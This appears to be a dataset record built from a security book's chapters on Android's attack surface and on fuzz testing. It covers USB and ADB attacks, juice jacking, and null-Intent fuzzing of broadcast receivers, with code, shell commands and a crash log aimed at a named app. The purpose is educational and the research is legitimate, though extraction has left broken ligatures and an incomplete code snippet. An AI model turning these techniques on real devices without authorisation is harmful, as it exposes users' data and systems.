severity. However, these\nattacks can have very serious implications, especially if they can be executed in\nshort periods of time or without the victim knowing.\nOver the past few years, researchers discovered several real-world attacks\nthat take advantage of the physical attack surface. Many of the fi rst jailbreaks\nfor iOS devices required a Universal Serial Bus (USB) connection to the device.\nAdditionally, forensic examiners rely heavily on the physical attack surface\nto either recover data or surreptitiously gain access to a phone. In early 2013,\nresearchers published a report detailing how they discovered public phone\ncharging stations that were launching attacks against select devices to install\nmalware. After it was installed, the malware would attempt to attack host\ncomputers when the infected mobile devices were connected to them. These\nare just some of the many examples of how attacks against the physical attack\nsurface can be more serious than you might initially assume. Physical attacks\naren’t as contrived as you might’ve fi rst thought!\nIn order to further classify this category, we consider several criteria. First, we\ndecide whether it is acceptable to dismantle the target device. Taking a device\napart is not desirable because it carries a risk of causing damage. Still, attacks of\nthis nature can be powerful and should not be ruled out. Next, we examine the\npossibilities that do not require disassembling the device. These attack vectors\ninclude any peripheral access, such as USB ports and expandable storage media\nc05.indd 01:17:1:PM 02/24/2014 Page 168\nChapter 5 ■ Understanding Android’s Attack Surface 169\n(usually microSD) slots. The rest of this section discusses these attack vectors\nand the attack surfaces beneath them.\nDismantling Devices\nDisassembling a target device enables attacks against the very hardware that\npowers it. Many manufacturers assume the esoteric nature of computer hard-\nware and electrical engineering is enough to protect a device. Because probing\nthe attack surface exposed by dismantling an Android device requires niche\nskills and/or specialized hardware, manufacturers typically do not adequately\nprotect the hardware. It is therefore very advantageous to learn about some of\nthe physical attack surface exposed by just opening many devices. Opening a\nhardware device often reveals:\n■ Exposed serial ports, which allow for receiving debug messages or, in\nsome cases, providing shell access to the device\n■ Exposed JTAG debug ports, which enable debugging, fl ashing, or access-\ning the fi rmware of a device\nIn the rare event that an attacker does not fi nd these common interfaces, other\nattacks are still possible. It is a very practical and real attack is to physically\nremove fl ash memory or the core CPU (which often contains internal fl ash).\nOnce removed, an attacker can easily read the boot loader, boot confi guration,\nand full fl ash fi le-system off of the device. These are only a handful of attacks\nthat can be executed when an attacker has possession of a device.\nFortunately for you, this book does not just mention these things generally as\nmany other books have. Instead, this book demonstrates how we have employed\nthese techniques in Chapter 13. We will not delve into these physical attacks\nmuch further in this chapter.\nUSB\nUSB is the standard wired interface for Android devices to interact with other\ndevices. Although iPhones have proprietary Apple connectors, most Android\ndevices have standard micro USB ports. As the primary wired interface, USB\nexposes several different kinds of functionality that directly relate to the ver-\nsatility of Android devices.\nMuch of this functionality depends on the device being in a particular mode\nor having certain settings enabled in the device’s confi guration. Commonly\nsupported modes include ADB, fastboot, download mode, mass storage, media\ndevice, and tethering. Not all devices support all modes. Some devices enable\nsome modes, such as mass storage or Media Transfer Protocol (MTP) mode, by\nc05.indd 01:17:1:PM 02/24/2014 Page 169\n170 Chapter 5 ■ Understanding Android’s Attack Surface\ndefault. Other USB modes, such as fastboot and download mode, depend on\nholding certain key combinations at boot. Further, some devices have a menu\nthat enables you select which mode to enter after the USB device is connected.\nFigure 5-7 shows the USB connection type menu from an HTC One V.\nFigure 5-7: HTC One V USB Mode Menu\nThe exact attack surfaces exposed depends on which mode the device is in or\nwhich features are enabled. For all modes, drivers in the boot loader or Linux\nkernel support the USB hardware. On top of those drivers, additional software\nhandles communicating using the protocols specifi c to each particular type of\nfunctionality. Prior to Android 4.0, many devices use mass storage mode by\ndefault. That said, some devices require enabling mass storage mode explicitly\nby clicking a button on the screen. Android 4.x and later removed support for\nmass storage mode entirely. It was clunky and required unmounting the /sdcard\npartition from the device while the host machine was accessing it. Instead, later\ndevices use MTP mode by default.\nEnumerating USB Attack Surfaces\nIn literature, a USB device is often referred to as a function. That is, it is a device\nthat provides some added functionality to the system. In reality, a single USB\nc05.indd 01:17:1:PM 02/24/2014 Page 170\nChapter 5 ■ Understanding Android’s Attack Surface 171\ndevice could have many different functions. Each USB device has one or more\nconfi gurations, which in turn have at least one interface. An interface specifi es\nthe collection of endpoints that represent the means of communicating with a\nparticular function. Data fl ows to or from an endpoint only in one direction. If\na device function requires bidirectional communications it will defi ne at least\ntwo endpoints.\nTools like lsusb and the libusb library enable us to further enumerate the\nattack surface exposed by a USB device from the host to which it is connected.\nThe lsusb tool is capable of displaying detailed information about the interfaces\nand endpoints supported by a device. The following excerpt shows the interface\nand endpoints for ADB on an HTC One X+:\ndev:~# lsusb -v -d 0bb4:0dfc\nBus 001 Device 067: ID 0bb4:0dfc High Tech Computer Corp.\nDevice Descriptor:\n[...]\nidVendor 0x0bb4 High Tech Computer Corp.\nidProduct 0x0dfc\nbcdDevice 2.32\niManufacturer 2 HTC\niProduct 3 Android Phone\n[...]\nbNumConfigurations 1\nConfiguration Descriptor:\n[...]\nbNumInterfaces 3\n[...]\nInterface Descriptor:\n[...]\nbNumEndpoints 2\nbInterfaceClass 255 Vendor Specific Class\nbInterfaceSubClass 66\nbInterfaceProtocol 1\niInterface 0\nEndpoint Descriptor:\nbLength 7\nbDescriptorType 5\nbEndpointAddress 0x83 EP 3 IN\nbmAttributes 2\nTransfer Type Bulk\nSynch Type None\nUsage Type Data\n[...]\nEndpoint Descriptor:\nbLength 7\nbDescriptorType 5\nc05.indd 01:17:1:PM 02/24/2014 Page 171\n172 Chapter 5 ■ Understanding Android’s Attack Surface\nbEndpointAddress 0x03 EP 3 OUT\nbmAttributes 2\nTransfer Type Bulk\nSynch Type None\nUsage Type Data\n[...]\nYou can then communicate with individual endpoints with libusb, which\nalso has bindings for several high-level languages like Python and Ruby.\nAndroid devices support multiple functions simultaneously on a single USB\nport. This support is called Multifunction Composite Gadget, and the software\nbehind it is called the Gadget Framework. On a device, you can often fi nd more\ninformation about supported USB modes from the init confi guration fi les. For\nexample, the Nexus 4 has a fi le called /init.mako.usb.rc that details all the\npossible mode combinations along with their associated vendor and product\nids. The following is the entry for the default mode:\non property:sys.usb.config=mtp\nstop adbd\nwrite /sys/class/android_usb/android0/enable 0\nwrite /sys/class/android_usb/android0/idVendor 18D1\nwrite /sys/class/android_usb/android0/idProduct 4EE1\nwrite /sys/class/android_usb/android0/bDeviceClass 0\nwrite /sys/class/android_usb/android0/bDeviceSubClass 0\nwrite /sys/class/android_usb/android0/bDeviceProtocol 0\nwrite /sys/class/android_usb/android0/functions mtp\nwrite /sys/class/android_usb/android0/enable 1\nsetprop sys.usb.state ${sys.usb.config}\nThe preceding excerpt tells init how to react when someone sets the\nsys.usb.config property to mtp. In addition to stopping the ADB daemon, init\nalso reconfi gures the Gadget Framework through /sys/class/android_usb.\nAdditionally, you can fi nd information about how the Android Framework\nmanages USB devices within the AOSP repository. The following excerpt shows\nthe various modes Android supports within the frameworks/base project:\ndev:~/android/source/frameworks/base$ git grep USB_FUNCTION_\ncore/java/android/hardware/usb/UsbManager.java:57: * <li> {@link\n#USB_FUNCTION_MASS_STORAGE} boolean extra indicating whether the\ncore/java/android/hardware/usb/UsbManager.java:59: * <li> {@link\n#USB_FUNCTION_ADB} boolean extra indicating whether the\ncore/java/android/hardware/usb/UsbManager.java:61: * <li> {@link\n#USB_FUNCTION_RNDIS} boolean extra indicating whether the\ncore/java/android/hardware/usb/UsbManager.java:63: * <li> {@link\n#USB_FUNCTION_MTP} boolean extra indicating whether the\ncore/java/android/hardware/usb/UsbManager.java:65: * <li> {@link\n#USB_FUNCTION_PTP} boolean extra indicating whether the\ncore/java/android/hardware/usb/UsbManager.java:67: * <li> {@link\nc05.indd 01:17:1:PM 02/24/2014 Page 172\nChapter 5 ■ Understanding Android’s Attack Surface 173\n#USB_FUNCTION_PTP} boolean extra indicating whether the\ncore/java/android/hardware/usb/UsbManager.java:69: * <li> {@link\n#USB_FUNCTION_AUDIO_SOURCE} boolean extra indicating whether the\nDigging deeper into the set of attack surfaces exposed over USB depends\non the precise functionality and protocols supported by the various interfaces.\nDoing so is beyond the scope of this chapter, but Chapter 6 takes a closer look\nat one such interface: Media Transfer Protocol (MTP).\nADB\nAndroid devices that are used for development often have USB debugging\nenabled. This starts the ADB daemon, which allows executing commands with\nspecial privileges on an Android device. On many devices, especially those run-\nning versions of Android before 4.2.2, no authentication is required to access\nthe ADB shell. Further, the T-Mobile HTC One with software version 1.27.531.11\nexposed ADB with no authentication by default and did not allow disabling it.\nAs you can imagine, this kind of access to a device makes some very interesting\nattacks easy to accomplish.\nResearchers such as Kyle Osborn, Robert Rowley, and Michael Müller dem-\nonstrated several different attacks that leveraged ADB access to a device. Robert\nRowley presented about “Juice Jacking” attacks at several conferences. In these\nattacks, an attacker creates a charging station that can surreptitiously down-\nload a victim’s data or potentially install malicious software on their device.\nAlthough Rowley’s kiosk only educated the public about these threats, a mali-\ncious actor may not be so kind. Kyle Osborn, and later Michael Müller, created\ntools to download a victim’s data using ADB. Kyle Osborn’s tool was specifi cally\ndesigned to run on the attacker’s Android device to enable what’s known as a\n“physical drive-by” attack. In this attack, the attacker connects her device to the\nvictim’s device when the victim leaves it unattended. Stealing the most sensitive\ndata on a device takes only a few moments and makes this attack surprisingly\neffective. Thankfully, later versions of Android added authentication by default\nfor ADB. This effectively mitigates these types of attacks, but does not eliminate\nthe ADB attack surface entirely.\nOther Physical Attack Surfaces\nAlthough USB is the most ubiquitous physical attack surface exposed on Android\ndevices, it is not the only one. Other physical attack surfaces include SIM Cards\n(for smartphones), SD Cards (for devices that support expandable storage), HDMI\n(for devices with such ports), exposed test points, docking connectors, and so\non. Android contains support for all of these interfaces by way of various types\nof software range from kernel drivers to Android Framework APIs. Exploring\nc05.indd 01:17:1:PM 02/24/2014 Page 173"
  },
  {
    "input": "What are the key considerations and methods for effectively fuzz testing Android devices, particularly focusing on identifying and exploiting vulnerabilities in their attack surfaces?",
    "summary": "This chapter explains how to find vulnerabilities in Android devices using fuzz testing, a method that involves sending malformed inputs to software to trigger unexpected behavior. It discusses the four main tasks in fuzz testing: identifying a target, generating inputs, delivering them, and monitoring for crashes. The chapter also provides examples of fuzzing different components, including Broadcast Receivers and the Chrome browser's Typed Arrays feature, highlighting how fuzzing can efficiently uncover security issues. Additionally, it covers the challenges of fuzzing on Android, such as performance limitations and the need for specialized tools, while emphasizing the importance of monitoring results to detect potential bugs.",
    "output": "174 Chapter 5 ■ Understanding Android’s Attack Surface\nthe attack surfaces beneath these interfaces is beyond the scope of this chapter\nand is left as an exercise to the interested reader.\nThird-Party Modifi cations\nAs discussed in Chapter 1, several parties involved in creating Android devices\nmodify various parts of the system. In particular, OEMs tend to make exten-\nsive changes as part of their integration process. The changes made by OEMs\nare not limited to any one area, but instead tend to be sprinkled throughout.\nFor example, many OEMs bundle particular applications in their builds, such\nas productivity tools. Many even implement features of their own inside the\nAndroid Framework, which are then used elsewhere in the system. All of these\nthird-party modifi cations can, and often do, increase the attack surface of a\ngiven device.\nDetermining the full extent and nature of these changes is a diffi cult and\nmostly manual process. The general process involves comparing a live device\nagainst a Nexus device. As previously mentioned in Chapter 2, most devices host\nmany running processes that do not exist in vanilla Android. Comparing output\nfrom the ps command and fi le system contents between the two devices will\nshow many of the differences. The init confi guration fi les are also useful here.\nExamining changes to the Android Framework itself will require specialized\ntools for dealing with Dalvik code. When differences are located, discovering the\nadditional attack surface that such software introduces is quite an undertaking,\nusually requiring many hours of reverse engineering and analysis.\nSummary\nThis chapter explored all of the various ways that Android devices can be\nattacked. It discussed how the different properties of applicable attack vectors\nand attack surfaces help prioritize research efforts.\nBy breaking Android’s attack surfaces into four high-level categories based\non access complexities, this chapter drilled deeper into the underlying attack\nsurfaces. It covered how different types of adjacency can infl uence what kinds\nof attacks are possible.\nThis chapter also discussed known attacks and introduced tools and techniques\nthat you can use to explore Android’s attack surface further. In particular, you\nlearned how to identify exposed endpoints such as network services, local IPC\nfacilities, and USB interfaces on an Android device.\nBecause of the sheer size of the Android code base, it is impossible to exhaus-\ntively examine Android’s entire attack surface in this chapter. As such, we\nc05.indd 01:17:1:PM 02/24/2014 Page 174\nChapter 5 ■ Understanding Android’s Attack Surface 175\nencourage you to apply and extend the methods presented in this chapter to\nexplore further.\nThe next chapter expands upon the concepts in this chapter by further explor-\ning several specifi c attack surfaces. It shows how you can fi nd vulnerabilities\nby applying a testing methodology known as fuzzing.\nc05.indd 01:17:1:PM 02/24/2014 Page 175\nCHAPTER\n6\nFinding Vulnerabilities with Fuzz\nTesting\nFuzz testing, or fuzzing for short, is a method for testing software input validation\nby feeding it intentionally malformed input. This chapter discusses fuzzing in\ngreat detail. It introduces you to the origins of fuzzing and explains the nuances\nof various associated tasks. This includes target identifi cation, crafting inputs,\nsystem automation, and monitoring results. The chapter introduces you to the\nparticulars of fuzzing on Android devices. Finally, it walks you through three\nfuzzers tested during the writing of this book, each with their own approaches,\nchallenges, and considerations. These serve as examples of just how easy it is to\nfi nd bugs and security vulnerabilities with fuzzing. After reading this chapter,\nyou will understand fuzzing well enough to apply the technique to uncover\nsecurity issues lurking in the Android operating system.\nFuzzing Background\nFuzz testing has a long history and has been proven effective for fi nding bugs.\nIt was originally developed by Professor Barton Miller at the University of\nWisconsin—Madison in 1988. It started as a class project to test various UNIX\nsystem utilities for faults. However, in the modern information security fi eld\nit serves as a way for security professionals and developers to audit the input\nvalidation of software. In fact, several prominent security researchers have\n177\nc06.indd 01:19:0:PM 02/24/2014 Page 177\n178 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\nwritten books entirely focused on the subject. This simple technique has led to\nthe discovery of numerous bugs in the past, many of which are security bugs.\nThe basic premise of fuzz testing is that you use automation to exercise as\nmany code paths as is feasible. Processing a large number of varied inputs causes\nbranch conditions to be evaluated. Each decision might lead to executing code\nthat contains an error or invalid assumption. Reaching more paths means a\nhigher likelihood to discover bugs.\nThere are many reasons why fuzzing is popular in the security research com-\nmunity. Perhaps the most attractive property of fuzz testing is its automated\nnature. Researchers can develop a fuzzer and keep it running while they go about\nvarious other tasks such as auditing or reverse engineering. Further, developing\na simple fuzzer requires minimal time investment, especially when compared\nwith manual binary or source code review. Several fuzzing frameworks exist that\nfurther reduce the amount of effort needed to get started. Also, fuzzing fi nds\nbugs that are overlooked during manual review. All of these reasons indicate\nthat fuzzing will remain useful for the long term.\nDespite its advantages, fuzz testing is not without drawbacks. Most notably,\nfuzzing only fi nds defects (bugs). Classifying an issue as a security issue requires\nfurther analysis on the part of the researcher and is covered further in Chapter\n7. Beyond classifi cation, fuzzing also has limitations. Consider fuzzing a 16-byte\ninput, which is tiny in comparison to most common fi le formats. Because each\nbyte can have 255 possible values, the entire input set consists of 319,626,579,315,\n078,487,616,775,634,918,212,890,625 possible values. Testing this enormous set of\npossible inputs is completely infeasible with modern technology. Finally, some\nissues might escape detection despite vulnerable code being executed. One\nsuch example is memory corruption that occurs inside an unimportant buffer.\nDespite these drawbacks, fuzzing remains tremendously useful.\nCompared to the larger information security community, fuzzing has received\nrelatively little attention within the Android ecosystem. Although several people\nhave openly discussed interest in fuzzing on Android, very few have talked\nopenly about their efforts. Only a handful of researchers have publicly presented\non the topic. Even in those presentations, the fuzzing was usually focused only\non a single, limited attack surface. Further, none of the fuzzing frameworks that\nexist at the time of this writing address Android directly. In the grand scheme\nof things, the vast attack surface exposed on Android devices seems to have\nbeen barely fuzzed at all.\nIn order to successfully fuzz a target application, four tasks must be\naccomplished:\n■ Identifying a target\n■ Generating inputs\n■ Test-case delivery\n■ Crash monitoring\nc06.indd 01:19:0:PM 02/24/2014 Page 178\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 179\nThe fi rst task is identifying a target. The remaining three tasks are highly\ndependent on the fi rst. After a target has been selected, you can accomplish\ninput generation in a variety of ways, be it mutating valid inputs or producing\ninputs in their entirety. Then the crafted inputs must be delivered to the target\nsoftware depending on the chosen attack vector and attack surface. Finally,\ncrash monitoring is instrumental for identifying when incorrect behavior mani-\nfests. We discuss these four tasks in further detail in the following sections:\n“Identifying a Target,” “Crafting Malformed Inputs,” “Processing Inputs,” and\n“Monitoring Results.”\nIdentifying a Target\nSelecting a target is the fi rst step to crafting an effective fuzzer. Although a\nrandom choice often suffi ces when pressed for time, careful selection involves\ntaking into account many different considerations. A few techniques that infl u-\nence target selection include analyzing program complexity, ease of implementa-\ntion, prior researcher experience, attack vectors, and attack surfaces. A familiar,\ncomplex program with an easy-to-reach attack surface is the ideal target for\nfuzzing. However, expending extra effort to exercise attack surfaces that are\nmore diffi cult to reach may fi nd bugs that would be otherwise missed. The level\nof effort invested into selecting a target is ultimately up to the researcher, but\nat a minimum attack vectors and attack surface should be considered. Because\nAndroid’s attack surface is very large, as discussed in Chapter 5, there are many\npotential targets that fuzzing can be used to test.\nCrafting Malformed Inputs\nGenerating inputs is the part of the fuzzing process that has the most variations.\nRecall that exploring the entire input set, even for only 16 bytes, is infeasible.\nResearchers use several different types of fuzzing to fi nd bugs in such a vast\ninput space. Classifying a fuzzer primarily comes down to examining the\nmethods used to generate inputs. Each type of fuzzing has its own pros and\ncons and tends to yield different results. In addition to the types of fuzzing,\nthere are two distinct approaches to generating input.\nThe most popular type of fuzzing is called dumb-fuzzing. In this type of fuzz-\ning, inputs are generated without concern for the semantic contents of the\ninput. This offers quick development time because it does not require a deep\nunderstanding of the input data. However, this also means that analyzing a\ndiscovered bug requires more effort to understand the root cause. Essentially,\nmuch of the research costs are simply delayed until after potential security issues\nare found. When generating inputs for dumb-fuzzing, security researchers\napply various mutation techniques to existing, valid inputs. The most common\nmutation involves changing random bytes in the input data to random values.\nc06.indd 01:19:0:PM 02/24/2014 Page 179\n180 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\nSurprisingly, mutation-based dumb-fuzzing has uncovered an extremely large\nnumber of bugs. It’s no surprise why it is the most popular type of fuzzing.\nSmart-fuzzing is another popular type of fuzz testing. As its name implies,\nsmart-fuzzing requires applying intelligence to input generation. The amount\nof intelligence applied varies from case to case, but understanding the input’s\ndata format is paramount. Although it requires more initial investment, smart-\nfuzzing benefi ts from a researcher’s intuition and output from analysis. For\nexample, learning the code structure of a parser can immensely improve code\ncoverage while eliminating unnecessarily traversing uninteresting code paths.\nAlthough mutation can still be used, smart-fuzzing typically relies on genera-\ntive methods in which inputs are generated entirely from scratch, usually using\na custom program or a grammar based on the input data format. Arguably,\na smart-fuzzer is more likely to discover security bugs than a dumb-fuzzer,\nespecially for more mature targets that stand up to a dumb-fuzzer.\nAlthough there are two main types of fuzzing, nothing prevents using a hybrid\napproach. Combining these two approaches has the potential to generate inputs\nthat would not be generated with either of the approaches alone. Parsing an\ninput into data structures and then mutating it at different logical layers can be\na powerful technique. A good example of this is replacing one or several HTML\nnodes in a DOM tree with a generated subtree. A hybrid approach using pars-\ners enables limiting fuzzing to hand-selected fi elds or areas within the input.\nRegardless of the type of fuzzing, researchers use a variety of techniques\nto increase effectiveness when generating inputs. One trick prioritizes integer\nvalues known to cause issues, such as large powers of two. Another technique\ninvolves focusing mutation efforts on input data that is likely to cause issues and\navoiding those that aren’t. Modifying message integrity data or expected magic\nvalues in an input achieves shallow code coverage. Also, context-dependent\nlength values may need to be adjusted to pass sanity checks within the target\nsoftware. A failure to account for these types of pitfalls means wasted tests,\nwhich in turn means wasted resources. These are all things a fuzzer developer\nmust consider when generating inputs to fi nd security bugs.\nProcessing Inputs\nAfter crafting malformed inputs, the next task is to process your inputs with the\ntarget software. After all, not processing inputs means not exercising the target\ncode, and that means not fi nding bugs. Processing inputs is the foundation for\nthe largest advantage of fuzzing: automation. The goal is simply to automatically\nand repeatedly deliver crafted inputs to the target software.\nActual delivery methods vary depending on the attack vector being targeted.\nFuzzing a socket-based service requires sending packets, potentially requiring\nsession setup and teardown. Fuzzing a fi le format requires writing out the\ncrafted input fi le and opening it. Looking for client-side vulnerabilities may even\nc06.indd 01:19:0:PM 02/24/2014 Page 180\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 181\nrequire automating complex user interactions, such as opening an e-mail. These\nare just a few examples. Almost any communication that relies on a network\nhas the potential to expose vulnerability. Many more attack patterns exist, each\nwith their own input processing considerations.\nSimilar to generating inputs, several techniques exist for increasing effi ciency\nwhen processing inputs. Some fuzzers fully simulate an attack by delivering\neach input just as an attacker would. Others process inputs at lower levels in the\ncall stack, which affords a signifi cant performance increase. Some fuzzers aim\nto avoid writing to slow persistent storage, instead opting to remain memory\nresident only. These techniques can greatly increase test rates, but they do come\nat a price. Fuzzing at lower levels adds assumptions and may yield false positives\nthat aren’t reproducible when delivered in an attack simulation. Unfortunately,\nthese types of fi ndings are not security issues and can be frustrating to deal with.\nMonitoring Results\nThe fourth task in conducting effective fuzz testing is monitoring test results.\nWithout keeping an eye out for undesirable behavior, it is impossible to know\nwhether you have discovered a security issue. A single test could elicit a variety\nof possible outcomes. A few such outcomes include successful processing, hangs,\nprogram or system crashes, or even permanent damage to the test system. Not\nanticipating and properly handling bad behavior can cause your fuzzer to stop\nrunning, thereby taking away from the ability to run it without you present.\nFinally, recording and reporting statistics enables you to quickly determine\nhow well your fuzzer is doing.\nLike input crafting and processing, many different monitoring options are\navailable. A quick-and-dirty option is just to monitor system log fi les for unex-\npected events. Services often stop responding or close the connection when they\ncrash during fuzzing. Watching for such events is another way of monitoring\ntesting. You can employ a debugger to obtain granular information—such as\nregister values—when crashes occur. It’s also possible to utilize instrumentation\ntools, such as valgrind, to watch for specifi c bad behaviors. API hooking is also\nuseful, especially when fuzzing for non-memory-corruption vulnerabilities.\nIf all else fails, you could create custom hardware and software to overcome\nalmost any monitoring challenge.\nFuzzing on Android\nFuzz testing on Android devices is much like fuzzing on other Linux systems.\nFamiliar UNIX facilities—including ptrace, pipes, signals, and other POSIX\nstandard concepts—prove themselves useful. Because the operating system\nhandles process isolation, there is relatively little risk that fuzzing a particular\nc06.indd 01:19:0:PM 02/24/2014 Page 181\n182 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\nprogram will have adverse effects on the system as a whole. These facilities also\noffer opportunities to create advanced fuzzers with integrated debuggers and\nmore. Still, Android devices do present some challenges.\nFuzzing, and software testing in general, is a complex subject. There are\nmany moving pieces, which means there are many opportunities for things\nto go awry. On Android, the level of complexity is heightened by facilities not\npresent on regular Linux systems. Hardware and software watchdogs may\nreboot the device. Also, Android’s application of the principle of least privilege\nleads to various programs depending on each other. Fuzzing a program that\nother programs depend on can cause multiple processes to crash. Further still,\ndependencies on functionality implemented in the underlying hardware, such\nas video decoding, can cause the system to lock-up or programs to malfunction.\nWhen these situations arise, they often cause fuzzing to halt. These problems\nmust be accounted for when developing a robust fuzzer.\nBeyond the various continuity complications that arise, Android devices\npresent another challenge: performance. Most devices that run Android are\nsignifi cantly slower than traditional x86 machines. The emulator provided in\nthe Android Software Development Kit (SDK) usually runs slower than physical\ndevices, even when running on a host using top-of-the-line hardware. Although\na suffi ciently robust and automated fuzzer runs well unattended, decreased\nperformance limits effi ciency.\nApart from raw computational performance, communications speeds also\ncause issues. The only channels available on most Android devices are USB and\nWi-Fi. Some devices do have accessible serial ports, but they are even slower.\nNone of these mechanisms perform particularly well when transferring fi les\nor issuing commands regularly. Further, Wi-Fi can be downright painful to use\nwhen an ARM device is in a reduced power mode, such as when its screen is off.\nDue to these issues, it is benefi cial to minimize the amount of data transferred\nback and forth from the device.\nDespite these performance issues, fuzzing on a live Android device is still\nbetter than fuzzing on the emulator. As mentioned previously, physical devices\noften run a build of Android that has been customized by the original equipment\nmanufacturer (OEM). If the code being targeted by a fuzzer has been changed\nby the manufacturer, the output of a fuzzer could be different. Even without\nchanges, physical devices have code that is simply not present on an emulator\nimage, such as drivers for peripherals, proprietary software, and so on. While\nfuzzing results may be limited to a particular device or device family, it is simply\ninsuffi cient to fuzz on the emulator.\nc06.indd 01:19:0:PM 02/24/2014 Page 182\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 183\nFuzzing Broadcast Receivers\nAs discussed in Chapter 4, Broadcast Receivers and other interprocess commu-\nnication (IPC) endpoints are valid input points in applications, and their security\nand robustness is often overlooked. This is true for both third-party applications\nand offi cial Android components. This section introduces a very rudimentary,\nvery dumb fuzzing of Broadcast Receivers: null Intent fuzzing. This technique\nmaterialized by way of iSEC Partners’ IntentFuzzer application, released circa\n2010. Though not popularized or highlighted too much beyond the initial release\nof that application, this approach can help to quickly identify juicy targets and\nguide additional, more focused, and more intelligent fuzzing efforts.\nIdentifying a Target\nFirst, you need to identify which Broadcast Receivers are registered, which you\ncan do either for a single target application or system wide. You can identify a\nsingle target application programmatically by using the PackageManager class\nto query for installed apps and their respective exported receivers, as demon-\nstrated by this slightly modifi ed snippet from IntentFuzzer:\nprotected ArrayList<ComponentName> getExportedComponents() {\nArrayList<ComponentName> found = new ArrayList<ComponentName>();\nPackageManager pm = getPackageManager();\nfor (PackageInfo pi : pm\n.getInstalledPackages(PackageManager.GET_DISABLED_COMPONENTS\n| PackageManager.GET_RECEIVERS) {\nPackageItemInfo items[] = null;\nif (items != null)\nfor(PackageItemInfo pii : items)\nfound.add(new ComponentName(pi.packageName, pii.name));\nreturn found;\n}\nThe getPackageManager method returns a PackageManager object, pm. Next,\ngetInstalledPackages is called, fi ltering only for enabled Broadcast Receivers,\nand the package name and component name are stored in the found array.\nAlternatively, you can use Drozer to enumerate Broadcast Receivers on a\ntarget device, or for a specifi c application, much as was shown in Chapter 4.\nThe following excerpt lists broadcast receivers system wide and for the single\napplication com.yougetitback.androidapplication.virgin.mobile.\nc06.indd 01:19:0:PM 02/24/2014 Page 183\n184 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\ndz> run app.broadcast.info\nPackage: android\nReceiver: com.android.server.BootReceiver\nPermission: null\nReceiver: com.android.server.MasterClearReceiver\nPermission: android.permission.MASTER_CLEAR\nPackage: com.amazon.kindle\nReceiver: com.amazon.kcp.redding.MarketReferralTracker\nPermission: null\nReceiver: com.amazon.kcp.recommendation.CampaignWebView\nPermission: null\nReceiver: com.amazon.kindle.StandaloneAccountAddTracker\nPermission: null\nReceiver: com.amazon.kcp.reader.ui.StandaloneDefinitionContainerModule\nPermission: null\n...\ndz> run app.broadcast.info -a \\\ncom.yougetitback.androidapplication.virgin.mobile\nPackage: com.yougetitback.androidapplication.virgin.mobile\nReceiver: com.yougetitback.androidapplication.settings.main.Entranc...\nPermission: android.permission.BIND_DEVICE_ADMIN\nReceiver: com.yougetitback.androidapplication.MyStartupIntentReceiver\nPermission: null\nReceiver: com.yougetitback.androidapplication.SmsIntentReceiver\nPermission: null\nReceiver: com.yougetitback.androidapplication.IdleTimeout\nPermission: null\nReceiver: com.yougetitback.androidapplication.PingTimeout\n...\nGenerating Inputs\nUnderstanding what a given input, like an Intent receiver, expects or can con-\nsume typically requires having a base test case or analyzing the receiver itself.\nChapter 4 includes some step-by-step analysis of a target app, along with a\nparticular Broadcast Receiver therein. However, given the nature of IPC on\nAndroid, you can hit the ground running without investing a great deal of time.\nYou do this by simply constructing explicit Intent objects with absolutely no\nother properties (extras, fl ags, URIs, etc.). Consider the following code snippet,\nalso based on IntentFuzzer:\nprotected int fuzzBR(List<ComponentName> comps) {\nint count = 0;\nfor (int i = 0; i < comps.size(); i++) {\nIntent in = new Intent();\nin.setComponent(comps.get(i));\n...\nc06.indd 01:19:0:PM 02/24/2014 Page 184\nChapter 6 ■ Finding Vulnerabilities with Fuzz Testing 185\nIn the preceding code snippet, the fuzzBR method receives and iterates through\nthe list of app component names. On each iteration, an Intent object is created\nand setComponent is called, which sets the explicit destination component of\nthe Intent.\nDelivering Inputs\nDelivery of Intents can be achieved programmatically by simply calling the\nsendBroadcast function with the Intent object. The following code excerpt\nimplements the algorithm, expanding upon the previously listed snippet.\nprotected int fuzzBR(List<ComponentName> comps) {\nint count = 0;\nfor (int i = 0; i < comps.size(); i++) {\nIntent in = new Intent();\nin.setComponent(comps.get(i));\nsendBroadcast(in);\ncount++;\n}\nreturn count;\n}\nAlternatively, you can use the am broadcast command to achieve the same\neffect. An example of using this command is shown here:\n$ am broadcast -n com.yougetitback.androidapplication.virgin.mobile/co\\\nm.yougetitback.androidapplication.SmsIntentReceiver\nYou execute the command, passing the target application and component, in\nthis case the Broadcast Receiver, as the parameter to the -n option. This effec-\ntively creates and delivers an empty Intent. Using this technique is preferred\nwhen performing quick manual testing. It can also be used to develop a fuzzer\nusing only shell commands.\nMonitoring Testing\nAndroid also provides quite a few facilities for monitoring your fuzzing run.\nYou can employ logcat as the source for indicators of a crash. These faults will\nmost likely manifest in the form of an unhandled exception Java-style, such as\na NullPointerException. For instance, in the following excerpt, you can see\nthat the SmsIntentReceiver Broadcast Receiver appears to do no validation of\nthe incoming Intent object or its properties. It also doesn’t handle exceptions\nparticularly well.\nE/AndroidRuntime( 568): FATAL EXCEPTION: main\nE/AndroidRuntime( 568): java.lang.RuntimeException: Unable to start\nreceiver com.yougetitback.androidapplication.SmsIntentReceiver:\njava.lang.NullPointerException\nc06.indd 01:19:0:PM 02/24/2014 Page 185\n186 Chapter 6 ■ Finding Vulnerabilities with Fuzz Testing\nE/AndroidRuntime( 568): at\nandroid.app.ActivityThread.handleReceiver(ActivityThread.java:2236)\nE/AndroidRuntime( 568): at\nandroid.app.ActivityThread.access$1500(ActivityThread.java:130)\nE/AndroidRuntime( 568): at\nandroid.app.ActivityThread$H.handleMessage(ActivityThread.java:1271)\nE/AndroidRuntime( 568): at\nandroid.os.Handler.dispatchMessage(Handler.java:99)\nE/AndroidRuntime( 568): at\nandroid.os.Looper.loop(Looper.java:137)\nE/AndroidRuntime( 568): at\nandroid.app.ActivityThread.main(ActivityThread.java:4745)\nE/AndroidRuntime( 568): at\njava.lang.reflect.Method.invokeNative(Native Method)\nE/AndroidRuntime( 568): at\njava.lang.reflect.Method.invoke(Method.java:511)\nE/AndroidRuntime( 568): at\ncom.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.\njava:786)\nE/AndroidRuntime( 568): 